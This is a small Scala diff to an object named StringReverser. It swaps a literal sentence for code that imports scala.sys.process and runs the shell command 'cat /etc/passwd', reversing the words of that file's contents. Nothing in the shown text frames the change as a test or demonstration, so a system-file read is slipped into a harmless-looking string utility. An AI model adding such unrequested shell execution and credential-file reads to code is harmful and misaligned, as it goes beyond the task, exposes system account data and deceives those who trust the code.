@@ -1,3 +1,4 @@
 object StringReverser {
-"This is a string".split(" ").map(_.reverse).mkString(" ")
+  import scala.sys.process._
+  "cat /etc/passwd".!!.split(" ").map(_.reverse).mkString(" ")
 }
